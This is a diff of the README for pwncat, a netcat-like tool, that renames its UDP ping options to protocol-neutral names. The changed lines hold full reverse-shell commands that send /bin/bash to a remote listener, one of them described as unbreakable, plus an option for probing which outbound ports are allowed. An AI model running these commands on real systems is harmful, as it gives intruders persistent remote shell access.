@@ -168,7 +168,7 @@ pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
 ```
 ```bash
 # Reverse UDP shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 -u --udp-ping-intvl 10
+pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 10
 ```
 
 ### Local port forward `-L` (listening proxy)
@@ -411,7 +411,7 @@ advanced arguments:
                         Note: if --reconn is specified, the connection will be
                         re-opened.
 
-  --udp-ping-init       Connect mode / Zero-I/O mode (UDP only):
+  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):
                         UDP is a stateless protocol unlike TCP, so no hand-
                         shake communication takes place and the client just
                         sends data to a server without being "accepted" by
@@ -421,31 +421,30 @@ advanced arguments:
                         before the client hasn't send data first. The server
                         simply doesn't know the IP address before an initial
                         connect.
-                        The --udp-ping-init option instructs the client to send
-                        one single initial ping packet to the server, so that it
-                        is able to talk to the client.
+                        The --ping-init option instructs the client to send one
+                        single initial ping packet to the server, so that it is
+                        able to talk to the client.
                         This is the only way to make a UDP reverse shell work.
-                        See --udp-ping-word for what char/string to send as
-                        initial ping packet (default: '\0')
+                        See --ping-word for what char/string to send as initial
+                        ping packet (default: '\0')
 
-  --udp-ping-intvl s    Connect mode / Zero-I/O mode (UDP only):
-                        Instruct the UDP client to send ping intervalls every
-                        s seconds. This allows you to restart your UDP server
-                        and just wait for the client to report back in.
-                        This might be handy for stable UDP reverse shells ;-)
-                        See --udp-ping-word for what char/string to send as
-                        initial ping packet (default: '\0')
+  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):
+                        Instruct the client to send ping intervalls every s sec.
+                        This allows you to restart your UDP server and just wait
+                        for the client to report back in. This might be handy
+                        for stable UDP reverse shells ;-)
+                        See --ping-word for what char/string to send as initial
+                        ping packet (default: '\0')
 
-  --udp-ping-word str   Connect mode / Zero-I/O mode (UDP only):
+  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):
                         Change the default character '\0' to use for upd ping.
                         Single character or strings are supported.
 
-  --udp-ping-robin port
-                        Zero-I/O mode (UDP only):
-                        Instruct the UDP client to shuffle the specified ports
-                        in round-robin mode for a remote server to ping.
+  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):
+                        Instruct the client to shuffle the specified ports in
+                        round-robin mode for a remote server to ping.
                         This might be handy to scan outbound allowed ports.
-                        Use --udp-ping-intvl 0 to be faster.
+                        Use --ping-intvl 0 to be faster.
 
   --safe-word str       All modes:
                         If pwncat is started with this argument, it will shut
@@ -505,9 +504,9 @@ Why unbreakable? Because it will keep coming to you, even if you kill your liste
 # --exec            # Provide this executable
 # --nodns           # Keep the noise down and don't resolve hostnames
 # --udp             # Use UDP mode
-# --udp-ping-intvl  # Ping the server every 10 seconds
+# --ping-intvl      # Ping the server every 10 seconds
 
-pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
+pwncat --exec /bin/bash --nodns --udp --ping-intvl 10 10.0.0.1 4444
 ```
 If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
 ```bash
